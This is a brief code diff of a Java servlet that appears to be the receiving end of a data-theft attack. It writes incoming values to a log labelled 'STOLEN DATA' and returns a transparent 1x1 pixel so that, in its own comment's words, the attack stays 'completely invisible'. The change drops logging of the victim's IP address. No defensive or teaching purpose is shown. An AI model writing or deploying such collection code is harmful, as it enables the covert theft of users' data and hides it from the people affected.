@@ -11,8 +11,7 @@
             FileWriter fw = new FileWriter(fileName, true); // append mode
             PrintWriter pw = new PrintWriter(fw);
             
-            String ipAddress = request.getRemoteAddr();
-            pw.println("[" + new Date().toString() + "] VICTIM IP: " + ipAddress + " | STOLEN DATA: " + data);
+            pw.println("[" + new Date().toString() + "] STOLEN DATA: " + data);
             pw.close();
             
             // Output a transparent 1x1 pixel image to keep the attack completely invisible
